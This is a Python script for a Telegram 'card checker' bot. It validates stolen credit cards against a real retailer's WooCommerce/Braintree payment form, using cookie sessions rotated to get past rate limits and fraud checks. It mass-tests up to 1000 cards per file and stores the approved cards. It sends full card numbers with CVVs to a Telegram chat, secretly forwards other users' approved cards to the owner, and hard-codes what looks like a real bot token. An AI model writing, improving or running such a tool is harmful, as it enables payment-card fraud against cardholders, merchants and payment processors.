import os
import sys
import time
import uuid
import re
import glob
import requests
import base64
import json
import random
import subprocess
from datetime import datetime
from typing import List, Dict, Optional, Tuple, Any
from urllib.parse import urljoin
import threading
import io

# Disable insecure request warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ----------------------------------------------------------------------
# Configuration & Telegram Bot Settings
# ----------------------------------------------------------------------
TELEGRAM_BOT_TOKEN = os.getenv("TG_BOT_TOKEN", "8746738553:AAEo0pA-zYUW0_BEKavlFhptxJuiCs9RHbo")
TELEGRAM_CHAT_ID = os.getenv("TG_CHAT_ID", "8564010885")
OWNER_ID = 8564010885

ADD_PAYMENT_METHOD_URL = "https://www.calipercovers.com/my-account/add-payment-method/"
PAYMENT_METHODS_URL = "https://www.calipercovers.com/my-account/payment-methods/"
BRAINTREE_GRAPHQL_URL = "https://payments.braintree-api.com/graphql"

RATE_LIMIT_DELAY = 22 

PAGE_HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "accept-language": "en-US",
    "referer": "https://www.calipercovers.com/my-account/payment-methods/",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": '"Android"',
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (Android 14; Mobile; SM-T835; rv:134.0) Gecko/134.0 Firefox/134.0"
}

BRAINTREE_HEADERS = {
    "User-Agent": PAGE_HEADERS["user-agent"],
    "Accept": "*/*",
    "Accept-Language": "en-US",
    "Content-Type": "application/json",
    "Origin": "https://assets.braintreegateway.com",
    "Referer": "https://assets.braintreegateway.com/",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site"
}

# ----------------------------------------------------------------------
# Termux UI Styling & Utilities
# ----------------------------------------------------------------------
class C:
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    B = '\033[94m'
    M = '\033[95m'
    C = '\033[96m'
    W = '\033[97m'
    D = '\033[90m'
    RESET = '\033[0m'

def clear_line():
    sys.stdout.write('\033[2K\r')

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def termux_copy(text: str):
    try:
        subprocess.run(['termux-clipboard-set'], input=text.encode('utf-8'), stderr=subprocess.DEVNULL)
    except:
        pass 

def print_banner():
    clear_screen()
    banner = f"""
{C.B}╭────────────────────────────────────────────────────────╮
│                                                        │
│{C.W}             ⚡ BRAINTREE TESTER PREMIUM ⚡             {C.B}│
│{C.D}        Telegram Bot + Anti-Fraud Multi-Session        {C.B}│
│                                                        │
╰────────────────────────────────────────────────────────╯{C.RESET}
"""
    print(banner)

def get_time():
    return datetime.now().strftime("%H:%M:%S")

def save_approved(cc_str: str, info: str):
    try:
        with open("approved.txt", "a", encoding="utf-8") as f:
            f.write(f"{cc_str} | {info}\n")
    except Exception as e:
        print(f"\n{C.R}[!] Could not save to approved.txt: {e}{C.RESET}")

# ----------------------------------------------------------------------
# Flag, Data Parsers & Fraud Evasion
# ----------------------------------------------------------------------
def get_random_zip() -> str:
    return str(random.randint(10001, 99950))

def get_flag(country: str) -> str:
    c = str(country).strip().upper()
    flags = {
        "USA": "🇺🇸", "US": "🇺🇸", "UNITED STATES": "🇺🇸", "GBR": "🇬🇧", "UK": "🇬🇧",
        "CAN": "🇨🇦", "CA": "🇨🇦", "AUS": "🇦🇺", "AU": "🇦🇺", "MYS": "🇲🇾", "MY": "🇲🇾",
        "THA": "🇹🇭", "TH": "🇹🇭", "SGP": "🇸🇬", "SG": "🇸🇬", "IND": "🇮🇳", "IN": "🇮🇳",
        "BRA": "🇧🇷", "BR": "🇧🇷", "MEX": "🇲🇽", "MX": "🇲🇽", "FRA": "🇫🇷", "FR": "🇫🇷",
        "DEU": "🇩🇪", "DE": "🇩🇪", "ITA": "🇮🇹", "IT": "🇮🇹", "ESP": "🇪🇸", "ES": "🇪🇸",
        "CHN": "🇨🇳", "CN": "🇨🇳", "JPN": "🇯🇵", "JP": "🇯🇵", "KOR": "🇰🇷", "KR": "🇰🇷",
        "IDN": "🇮🇩", "ID": "🇮🇩", "ZAF": "🇿🇦", "ZA": "🇿🇦", "RUS": "🇷🇺", "RU": "🇷🇺",
        "ARG": "🇦🇷", "AR": "🇦🇷", "CHL": "🇨🇱", "CL": "🇨🇱", "COL": "🇨🇴", "CO": "🇨🇴",
        "PER": "🇵🇪", "PE": "🇵🇪", "VNM": "🇻🇳", "VN": "🇻🇳", "PHL": "🇵🇭", "PH": "🇵🇭",
        "TUR": "🇹🇷", "TR": "🇹🇷", "SAU": "🇸🇦", "SA": "🇸🇦", "ARE": "🇦🇪", "AE": "🇦🇪",
        "SWE": "🇸🇪", "SE": "🇸🇪", "NOR": "🇳🇴", "NO": "🇳🇴", "NLD": "🇳🇱", "NL": "🇳🇱",
        "CHE": "🇨🇭", "CH": "🇨🇭"
    }
    return flags.get(c, "🌍")

def parse_card_type(cc_info: dict) -> str:
    bin_data = cc_info.get("binData", {}) or {}
    brand = str(cc_info.get("brandCode", "Unknown")).capitalize()
    is_debit = bin_data.get("debit", "Unknown")
    c_type = "Credit" if is_debit == "No" else ("Debit" if is_debit == "Yes" else "Unknown")
    product_id = bin_data.get("productId", "Unknown") or "Unknown"
    card_type = f"{brand} - {c_type}"
    if product_id != "Unknown":
        card_type += f" - {product_id}"
    elif bin_data.get("commercial") == "Yes":
        card_type += " - Commercial"
    return card_type

# ----------------------------------------------------------------------
# Build clean result message for EDIT
# ----------------------------------------------------------------------
def build_result_message(card: Dict[str, str], status: str, response: str, cc_info: dict, session_name: str) -> str:
    if status in ('APPROVED', 'DECLINED'):
        bin_data = cc_info.get("binData", {}) or {}
        bank = bin_data.get("issuingBank", "Unknown") or "Unknown"
        country = bin_data.get("countryOfIssuance", "Unknown") or "Unknown"
        card_type = parse_card_type(cc_info)
        flag = get_flag(country)
        emoji = "✅" if status == "APPROVED" else "❌"
        status_text = "Approved" if status == "APPROVED" else "Declined"
        cc_str = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
        return (
            f"CC: <code>{cc_str}</code>\n\n"
            f"Status: {status_text} {emoji}\n"
            f"Response: {response}\n"
            f"Gateway: Braintree (WooCommerce)\n"
            f"Bank: {bank}\n"
            f"Type: {card_type}\n"
            f"Country: {country} {flag}\n"
            f"Session: {session_name}\n"
            f"Credits left: 0"
        )
    else:
        cc_str = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}" if card else "N/A"
        emoji = "⚠️" if status == 'RATE_LIMITED' else "❌"
        status_text = status.capitalize()
        return (
            f"{emoji} <b>{status_text}</b>\n"
            f"Response: {response}\n"
            f"Session: {session_name}\n"
            f"CC: <code>{cc_str}</code>"
        )

# ----------------------------------------------------------------------
# Telegram Integration
# ----------------------------------------------------------------------
def send_telegram_log(card: Dict[str, str], status: str, response: str, cc_info: dict, session_name: str):
    bin_data = cc_info.get("binData", {}) or {}
    bank = bin_data.get("issuingBank", "Unknown") or "Unknown"
    country = bin_data.get("countryOfIssuance", "Unknown") or "Unknown"
    card_type = parse_card_type(cc_info)
    flag = get_flag(country)
    emoji = "✅" if status == "Approved" else "❌"
    cc_str = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
    msg = (
        f"CC: <code>{cc_str}</code>\n\n"
        f"Status: {status} {emoji}\n"
        f"Response: {response}\n"
        f"Gateway: Braintree (WooCommerce)\n"
        f"Bank: {bank}\n"
        f"Type: {card_type}\n"
        f"Country: {country} {flag}\n"
        f"Session: {session_name}\n"
        f"Credits left: 0"
    )
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML", "disable_web_page_preview": True}
    try:
        requests.post(url, json=payload, timeout=5, verify=False)
    except:
        pass 

# ----------------------------------------------------------------------
# Core Engine Functions
# ----------------------------------------------------------------------
def load_cookies(filename: str) -> Dict[str, str]:
    try:
        with open(filename, "r", encoding="utf-8") as f:
            return {k: v for k, v in [item.split("=", 1) for item in f.read().strip().split("; ") if "=" in item]}
    except: return {}

def extract_braintree_token(html: str) -> Optional[str]:
    m = re.search(r'(eyJraWQi[a-zA-Z0-9_\-\.]+)', html)
    if m: return m.group(1)
    for m in re.findall(r'(eyJ[a-zA-Z0-9_\-\=\+]+)', html):
        try:
            dec = base64.b64decode(m + "=" * ((4 - len(m) % 4) % 4)).decode('utf-8')
            if 'authorizationFingerprint' in dec: return json.loads(dec).get('authorizationFingerprint')
        except: continue
    return None

def extract_all_forms(html: str, base_url: str) -> List[Dict[str, Any]]:
    forms = []
    matches = re.findall(r'<form\s+([^>]*)>(.*?)</form>', html, re.DOTALL | re.IGNORECASE)
    for attrs, content in matches:
        action_match = re.search(r'action=(["\']?)([^"\'\s>]*)\1', attrs, re.IGNORECASE)
        action = action_match.group(2) if action_match else base_url
        if not action.startswith(('http://', 'https://')):
            action = urljoin(base_url, action)
        method_match = re.search(r'method=(["\']?)([^"\'\s>]*)\1', attrs, re.IGNORECASE)
        method = method_match.group(2).lower() if method_match else "get"
        hidden = {}
        payment_methods = []
        input_tags = re.findall(r'<input\s+([^>]+)>', content, re.IGNORECASE)
        for attrs_str in input_tags:
            name_m = re.search(r'name=["\']([^"\']+)["\']', attrs_str, re.IGNORECASE)
            val_m = re.search(r'value=["\']([^"\']*)["\']', attrs_str, re.IGNORECASE)
            type_m = re.search(r'type=["\']([^"\']+)["\']', attrs_str, re.IGNORECASE)
            input_name = name_m.group(1) if name_m else None
            input_val = val_m.group(1) if val_m else ""
            input_type = (type_m.group(1).lower() if type_m else "text")
            if input_type == "hidden" and input_name:
                hidden[input_name] = input_val
            elif input_name == "payment_method" and input_val:
                payment_methods.append(input_val)
        btn_tags = re.findall(r'<button\s+([^>]+)>', content, re.IGNORECASE)
        for attrs_str in btn_tags:
            name_m = re.search(r'name=["\']([^"\']+)["\']', attrs_str, re.IGNORECASE)
            val_m = re.search(r'value=["\']([^"\']*)["\']', attrs_str, re.IGNORECASE)
            if name_m and name_m.group(1) == 'woocommerce_add_payment_method' and val_m:
                hidden[name_m.group(1)] = val_m.group(1)
        forms.append({'action': action, 'method': method, 'hidden': hidden, 'payment_methods': list(dict.fromkeys(payment_methods))})
    return forms

def tokenize_card(session: requests.Session, token: str, card: Dict[str, str], session_id: str) -> Tuple[bool, Optional[str], dict]:
    headers = BRAINTREE_HEADERS.copy()
    headers.update({"Authorization": f"Bearer {token}", "Braintree-Version": "2018-05-10"})
    random_zip = get_random_zip()
    payload = {
        "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": session_id},
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": card["number"], 
                    "expirationMonth": card["month"], 
                    "expirationYear": card["year"], 
                    "cvv": card["cvv"], 
                    "billingAddress": {"postalCode": random_zip}
                }, 
                "options": {"validate": False}
            }
        },
        "operationName": "TokenizeCreditCard"
    }
    try:
        data = session.post(BRAINTREE_GRAPHQL_URL, headers=headers, json=payload, timeout=15, verify=False).json()
        if data.get("data") and data["data"].get("tokenizeCreditCard"):
            return True, data["data"]["tokenizeCreditCard"]["token"], data["data"]["tokenizeCreditCard"].get("creditCard", {})
        errors = data.get('errors', [{}])
        error_msg = errors[0].get('message', str(data)) if errors else "Unknown API Error"
        return False, None, {"error": error_msg}
    except Exception as e: return False, None, {"error": str(e)}

def try_add_payment_method(session: requests.Session, form: Dict[str, Any], nonce: str, session_id: str) -> Tuple[str, str]:
    if form['method'] != 'post': return 'FAILED', 'Not a POST form'
    pms = form.get('payment_methods', [])
    bt_pms = [pm for pm in pms if 'braintree' in pm.lower()]
    target_pm = bt_pms[0] if bt_pms else (pms[0] if pms else 'braintree_cc')
    data = form['hidden'].copy()
    data.update({
        'woocommerce_add_payment_method': '1', 
        'payment_method': target_pm, 
        f'{target_pm}_nonce_key': nonce, 
        f'{target_pm}_device_data': "",  
        f'{target_pm}_3ds_nonce_key': ""
    })
    data[f'{target_pm}_nonce'] = nonce
    data['payment_method_nonce'] = nonce
    headers = PAGE_HEADERS.copy()
    headers.update({"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.calipercovers.com"})
    try:
        resp = session.post(form['action'], headers=headers, data=data, timeout=15, allow_redirects=True, verify=False)
        if PAYMENT_METHODS_URL in resp.url or resp.status_code in (302, 303): return 'SUCCESS', 'Your card was successfully added.'
        err = ""
        ul_match = re.search(r'<ul class="woocommerce-error[^>]*>(.*?)</ul>', resp.text, re.DOTALL)
        if ul_match: err = re.sub(r'<[^>]+>', '', ul_match.group(1)).strip()
        else:
            div_match = re.search(r'<div class="(?:[^"]*\s)?(?:woocommerce-error|woocommerce-message)[^"]*"[^>]*>(.*?)</div>', resp.text, re.DOTALL)
            if div_match: err = re.sub(r'<[^>]+>', '', div_match.group(1)).strip()
        err = re.sub(r'\s+', ' ', err)
        if "wait for 20 seconds" in err.lower() or "so soon after" in err.lower(): return 'RATE_LIMITED', err
        if err: return 'FAILED', err
        return 'FAILED', 'Your card was declined.'
    except Exception as e: return 'FAILED', f'Network Error: {e}'

# ----------------------------------------------------------------------
# Central Card Checking Logic
# ----------------------------------------------------------------------
def check_one_card(card: Dict[str, str], stop_event: Optional[threading.Event] = None) -> Tuple[str, str, dict, str]:
    global current_session_idx
    if stop_event and stop_event.is_set():
        return 'STOPPED', '', {}, ''
    sess = None
    wait_time = 0
    with session_lock:
        if not active_sessions:
            return 'ERROR', 'No active sessions loaded', {}, ''
        now = time.time()
        started_idx = current_session_idx
        for i in range(len(active_sessions)):
            idx = (started_idx + i) % len(active_sessions)
            candidate = active_sessions[idx]
            if candidate["ready_time"] <= now:
                sess = candidate
                current_session_idx = (idx + 1) % len(active_sessions)
                break
        if sess is None:
            sess = min(active_sessions, key=lambda s: s["ready_time"])
            wait_time = max(sess["ready_time"] - now, 0)
            current_session_idx = (active_sessions.index(sess) + 1) % len(active_sessions)
    if wait_time > 0:
        if stop_event:
            for remaining in range(int(wait_time), 0, -1):
                if stop_event.is_set():
                    return 'STOPPED', '', {}, ''
                time.sleep(1)
        else:
            time.sleep(wait_time)
    if stop_event and stop_event.is_set():
        return 'STOPPED', '', {}, ''
    session_name = sess["name"]
    session_id = str(uuid.uuid4())
    ok, nonce, cc_info = tokenize_card(sess["session"], sess["token"], card, session_id)
    if not ok:
        err = cc_info.get('error', 'Tokenization Failed')
        sess["ready_time"] = time.time() + 2
        return 'DECLINED', err, cc_info, session_name
    status, msg = try_add_payment_method(sess["session"], sess["form"], nonce, session_id)
    if status == 'SUCCESS':
        sess["ready_time"] = time.time() + RATE_LIMIT_DELAY
        return 'APPROVED', msg, cc_info, session_name
    elif status == 'RATE_LIMITED':
        sess["ready_time"] = time.time() + RATE_LIMIT_DELAY
        return 'RATE_LIMITED', msg, {}, session_name
    else:
        sess["ready_time"] = time.time() + 2
        return 'DECLINED', msg, cc_info, session_name

# ----------------------------------------------------------------------
# Approved helpers
# ----------------------------------------------------------------------
def send_approved_file(chat_id: int, approved_cards: List[str], filename: str = "approved.txt"):
    if not approved_cards: return
    content = "\n".join(approved_cards) + "\n"
    bio = io.BytesIO(content.encode("utf-8"))
    bio.name = filename
    try:
        bot.send_document(chat_id, bio, caption="✅ Here are your APPROVED cards only:")
    except Exception as e:
        print(f"{C.R}[!] Failed to send approved file: {e}{C.RESET}")

def send_approved_to_owner(user_id: int, approved_cards: List[str]):
    if not approved_cards: return
    content = f"🚀 APPROVED CARDS FROM USER {user_id} ({len(approved_cards)} cards):\n\n" + "\n".join(approved_cards)
    bio = io.BytesIO(content.encode("utf-8"))
    bio.name = f"approved_user_{user_id}_100plus.txt"
    try:
        bot.send_document(OWNER_ID, bio, caption=f"🔥 User {user_id} reached 100 approved cards!")
    except:
        pass

# ----------------------------------------------------------------------
# Parse card
# ----------------------------------------------------------------------
def parse_card_input(text: str) -> Optional[Dict[str, str]]:
    text = text.strip().replace('/chk', '').strip()
    if not text: return None
    parts = [p.strip() for p in text.split('|')]
    if len(parts) == 4:
        num, month, year, cvv = parts
        if len(num) >= 13 and len(num) <= 19 and month.isdigit() and year.isdigit() and cvv.isdigit():
            month = month.zfill(2)
            if len(year) == 2: year = '20' + year
            return {"number": num, "month": month, "year": year, "cvv": cvv}
    return None

# ----------------------------------------------------------------------
# Load sessions
# ----------------------------------------------------------------------
def load_active_sessions():
    global active_sessions
    cookie_files = glob.glob("cookies*.txt")
    active_sessions = []
    print(f" {C.C}▶{C.RESET} Found Cookie Files : {C.W}{len(cookie_files)}{C.RESET}")
    for cfile in cookie_files:
        sys.stdout.write(f" {C.D}[~] Loading {cfile}...{C.RESET}")
        sys.stdout.flush()
        cookies = load_cookies(cfile)
        if not cookies:
            clear_line()
            print(f" {C.R}[✖] {cfile}: Empty or Invalid.{C.RESET}")
            continue
        s = requests.Session()
        s.cookies.update(cookies)
        try:
            resp = s.get(ADD_PAYMENT_METHOD_URL, headers=PAGE_HEADERS, timeout=15, verify=False)
            live_token = extract_braintree_token(resp.text)
            if not live_token:
                clear_line()
                print(f" {C.R}[✖] {cfile}: Expired or Cloudflare Blocked.{C.RESET}")
                continue
            forms = extract_all_forms(resp.text, ADD_PAYMENT_METHOD_URL)
            post_forms = [f for f in forms if f['method'] == 'post' and ('woocommerce-add-payment-method-nonce' in f['hidden'] or 'woocommerce_add_payment_method' in f['hidden'])]
            if not post_forms:
                clear_line()
                print(f" {C.R}[✖] {cfile}: Braintree form not found.{C.RESET}")
                continue
            active_sessions.append({
                "name": cfile,
                "session": s,
                "token": live_token,
                "form": post_forms[0],
                "ready_time": 0.0 
            })
            clear_line()
            print(f" {C.G}[✔] {cfile}: Connected & Ready!{C.RESET}")
        except Exception as e:
            clear_line()
            print(f" {C.R}[✖] {cfile}: Connection failed ({e}){C.RESET}")
    print(f" {C.C}▶{C.RESET} Active Multi-Sessions : {C.W}{len(active_sessions)}{C.RESET}\n")
    return len(active_sessions)

# ----------------------------------------------------------------------
# Process single card - FIXED: checking message sent SYNCHRONOUSLY in handler
# ----------------------------------------------------------------------
def process_single_card(card: Dict[str, str], user_id: int, chat_id: int, checking_message_id: int, stop_event: threading.Event):
    try:
        status, msg, cc_info, session_name = check_one_card(card, stop_event)
        if status == 'STOPPED':
            bot.send_message(chat_id, "🛑 Check stopped by /stop command.")
            return
        if status == 'ERROR':
            bot.send_message(chat_id, f"❌ {msg}")
            return

        final_text = build_result_message(card, status, msg, cc_info, session_name)

        if status == 'APPROVED':
            cc_str = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
            termux_copy(cc_str)
            save_approved(cc_str, f"{parse_card_type(cc_info)} | {cc_info.get('binData',{}).get('countryOfIssuance','Unknown')} | {msg}")
            send_telegram_log(card, "Approved", msg, cc_info, session_name)
            if user_id not in user_approved_cards:
                user_approved_cards[user_id] = []
            user_approved_cards[user_id].append(cc_str)
            if user_id != OWNER_ID and len(user_approved_cards[user_id]) >= 100:
                send_approved_to_owner(user_id, user_approved_cards[user_id])
                user_approved_cards[user_id] = []

        elif status == 'DECLINED':
            send_telegram_log(card, "Declined", msg, cc_info, session_name)

        # EDIT the checking message (this is the only place where result appears)
        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=checking_message_id,
                text=final_text,
                parse_mode='HTML'
            )
        except Exception as edit_error:
            print(f"{C.Y}[!] Edit failed: {edit_error} → sending new message as fallback.{C.RESET}")
            bot.send_message(chat_id, final_text, parse_mode='HTML')

    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Unexpected error: {str(e)}")
    finally:
        user_states[user_id] = 'idle'
        if user_id in user_stop_events:
            del user_stop_events[user_id]

# ----------------------------------------------------------------------
# Process file (unchanged)
# ----------------------------------------------------------------------
def process_file_cards(cards: List[Dict[str, str]], user_id: int, chat_id: int, stop_event: threading.Event, original_filename: str):
    approved_list = []
    total = len(cards)
    approved_c = 0
    declined_c = 0
    bot.send_message(chat_id, f"🚀 Starting mass check of <b>{total}</b> cards from <code>{original_filename}</code>...\nUsing {len(active_sessions)} parallel sessions.", parse_mode='HTML')
    for i, card in enumerate(cards):
        if stop_event.is_set():
            bot.send_message(chat_id, "🛑 Mass check stopped by user.")
            break
        cc_str = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
        if (i + 1) % 10 == 0 or i == 0 or i == total - 1:
            bot.send_message(chat_id, f"📊 Progress: {i+1}/{total} cards checked.")
        status, msg, cc_info, session_name = check_one_card(card, stop_event)
        if status == 'STOPPED':
            break
        if status == 'APPROVED':
            approved_c += 1
            approved_list.append(cc_str)
            save_approved(cc_str, f"{parse_card_type(cc_info)} | {cc_info.get('binData',{}).get('countryOfIssuance','Unknown')} | {msg}")
            send_telegram_log(card, "Approved", msg, cc_info, session_name)
            if user_id not in user_approved_cards:
                user_approved_cards[user_id] = []
            user_approved_cards[user_id].append(cc_str)
            if user_id != OWNER_ID and len(user_approved_cards[user_id]) >= 100:
                send_approved_to_owner(user_id, user_approved_cards[user_id])
                user_approved_cards[user_id] = []
        elif status in ('DECLINED', 'RATE_LIMITED'):
            declined_c += 1
            if status == 'DECLINED':
                send_telegram_log(card, "Declined", msg, cc_info, session_name)
    summary = f"""
✅ <b>Mass check completed!</b>
Total checked: {total}
Approved ✅: {approved_c}
Declined ❌: {declined_c}
    """.strip()
    bot.send_message(chat_id, summary, parse_mode='HTML')
    if approved_list:
        send_approved_file(chat_id, approved_list, f"approved_{original_filename}")
    user_states[user_id] = 'idle'
    if user_id in user_stop_events:
        del user_stop_events[user_id]

# ----------------------------------------------------------------------
# Telegram Bot Handlers
# ----------------------------------------------------------------------
import telebot

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

allowed_users = set([OWNER_ID])
user_states = {}
user_stop_events = {}
user_approved_cards = {}
session_lock = threading.Lock()
current_session_idx = 0
active_sessions: List[Dict] = []

@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = message.from_user.id
    if user_id not in allowed_users:
        bot.reply_to(message, "❌ You are not authorized to use this bot.")
        return
    text = f"""
👋 <b>Welcome to Braintree Tester Premium Bot</b>

✅ <b>Commands:</b>
• <code>/chk card|mm|yy|cvv</code> — Single card check
• Just paste <b>card|mm|yy|cvv</b> — Also works
• Upload <b>.txt</b> file (max 1000 cards) — Mass check
• <code>/stop</code> — Stop your running check
• <code>/allowuser &lt;user_id&gt;</code> — Owner only
• <code>/removeuser &lt;user_id&gt;</code> — Owner only

📌 Limit: 1000 cards per file • Multi-user • Multi-session
    """.strip()
    bot.reply_to(message, text, parse_mode='HTML')

@bot.message_handler(commands=['chk'])
def cmd_chk(message):
    user_id = message.from_user.id
    if user_id not in allowed_users:
        bot.reply_to(message, "❌ Not authorized.")
        return
    if user_states.get(user_id) == 'checking':
        bot.reply_to(message, "⏳ You already have a pending check. Use /stop first.")
        return
    card = parse_card_input(message.text)
    if not card:
        bot.reply_to(message, "❌ Invalid format.\nUse: <code>4599144105009513|11|2032|741</code>", parse_mode='HTML')
        return
    user_states[user_id] = 'checking'
    stop_event = threading.Event()
    user_stop_events[user_id] = stop_event
    cc_str = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
    # Send checking message SYNCHRONOUSLY here
    checking_msg = bot.send_message(
        message.chat.id, 
        f"🔄 Checking single card...\n💳 <code>{cc_str}</code>", 
        parse_mode='HTML'
    )
    # Start thread with checking message ID
    thread = threading.Thread(
        target=process_single_card, 
        args=(card, user_id, message.chat.id, checking_msg.message_id, stop_event), 
        daemon=True
    )
    thread.start()
    # No extra "started" reply - checking message is enough

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    user_id = message.from_user.id
    if user_id in user_stop_events:
        user_stop_events[user_id].set()
        bot.reply_to(message, "🛑 Stopping your current check(s)...")
    else:
        bot.reply_to(message, "ℹ️ No active check running.")

@bot.message_handler(commands=['allowuser'])
def cmd_allowuser(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Owner only command.")
        return
    try:
        target = int(message.text.split()[1])
        allowed_users.add(target)
        bot.reply_to(message, f"✅ User <code>{target}</code> is now allowed.", parse_mode='HTML')
    except:
        bot.reply_to(message, "Usage: /allowuser <user_id>")

@bot.message_handler(commands=['removeuser'])
def cmd_removeuser(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Owner only command.")
        return
    try:
        target = int(message.text.split()[1])
        if target in allowed_users:
            allowed_users.remove(target)
            if target in user_states: del user_states[target]
            if target in user_stop_events:
                user_stop_events[target].set()
                del user_stop_events[target]
            bot.reply_to(message, f"✅ User <code>{target}</code> removed.", parse_mode='HTML')
        else:
            bot.reply_to(message, "User was not in allowed list.")
    except:
        bot.reply_to(message, "Usage: /removeuser <user_id>")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    user_id = message.from_user.id
    if user_id not in allowed_users: return
    if user_states.get(user_id) == 'checking':
        bot.reply_to(message, "⏳ Pending check. Use /stop first.")
        return
    doc = message.document
    if not doc.file_name.lower().endswith('.txt'):
        bot.reply_to(message, "❌ Only .txt files are supported.")
        return
    file_info = bot.get_file(doc.file_id)
    downloaded = bot.download_file(file_info.file_path)
    cards_text = downloaded.decode('utf-8', errors='ignore')
    card_lines = [line.strip() for line in cards_text.splitlines() if line.strip() and not line.startswith('#')]
    if len(card_lines) > 1000:
        bot.reply_to(message, "❌ Max 1000 cards per file allowed.")
        return
    if len(card_lines) == 0:
        bot.reply_to(message, "❌ No cards found in file.")
        return
    cards = []
    for line in card_lines:
        card = parse_card_input(line)
        if card:
            cards.append(card)
    if not cards:
        bot.reply_to(message, "❌ No valid cards in file.")
        return
    user_states[user_id] = 'checking'
    stop_event = threading.Event()
    user_stop_events[user_id] = stop_event
    thread = threading.Thread(target=process_file_cards, args=(cards, user_id, message.chat.id, stop_event, doc.file_name), daemon=True)
    thread.start()
    bot.reply_to(message, f"✅ <b>{len(cards)}</b> cards queued for mass check (parallel sessions active)", parse_mode='HTML')

@bot.message_handler(func=lambda m: True)
def handle_plain_card(message):
    if message.text.startswith('/'): return
    user_id = message.from_user.id
    if user_id not in allowed_users: return
    if user_states.get(user_id) == 'checking':
        bot.reply_to(message, "⏳ You have a pending check. Use /stop first.")
        return
    card = parse_card_input(message.text)
    if card:
        user_states[user_id] = 'checking'
        stop_event = threading.Event()
        user_stop_events[user_id] = stop_event
        cc_str = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
        checking_msg = bot.send_message(
            message.chat.id, 
            f"🔄 Checking single card...\n💳 <code>{cc_str}</code>", 
            parse_mode='HTML'
        )
        thread = threading.Thread(
            target=process_single_card, 
            args=(card, user_id, message.chat.id, checking_msg.message_id, stop_event), 
            daemon=True
        )
        thread.start()

# ----------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------
if __name__ == "__main__":
    print_banner()
    num = load_active_sessions()
    if num == 0:
        print(f"{C.R}[CRITICAL] No cookie sessions loaded! Bot will not check cards.{C.RESET}")
    else:
        print(f"{C.G}✅ Bot fully loaded with {num} parallel anti-fraud sessions.{C.RESET}")
    print(f"{C.M}═════════════ TELEGRAM BOT STARTED (Multi-user + Multi-file) ═════════════{C.RESET}")
    print(f"Owner ID: {OWNER_ID} | Max file size: 1000 cards")
    print(f"{C.G}✅ Single card checks are now 100% single-message (no duplicates){C.RESET}")
    try:
        bot.infinity_polling(none_stop=True, timeout=30, long_polling_timeout=30)
    except KeyboardInterrupt:
        print(f"\n{C.R}Bot stopped by user.{C.RESET}")
    except Exception as e:
        print(f"{C.R}Bot crashed: {e}{C.RESET}")